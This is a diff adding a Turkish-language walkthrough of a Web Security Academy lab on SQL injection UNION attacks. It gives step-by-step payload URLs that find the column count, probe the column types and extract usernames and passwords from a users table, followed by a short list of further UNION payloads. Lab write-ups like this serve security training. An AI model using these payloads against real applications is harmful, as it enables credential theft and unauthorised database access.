@@ -1,0 +1,20 @@
+LAB: SQL injection UNION attack, retrieving multiple values in a single column
+
+1 - Bir kategori seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Gifts
+
+2 - Sütun sayısını buluyoruz. Hata vermeden bir önceki değer bize sütun sayısını işaret eder.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%202--
+
+3 - Sütunların türlerini buluyoruz. 1. sütun string değil, 2. sütun string.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27abc%27--
+
+4 - Users sütunundaki değerleri getiriyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,username||%27%20%27||password+FROM+users--
+
+5 - Administrator ile giriş yapınca oda çözülüyor.
+
+Diger payloadlar:
+' UNION SELECT NULL, username from users--
+' UNION SELECT NULL, password from users--
+' UNION SELECT NULL, version()--
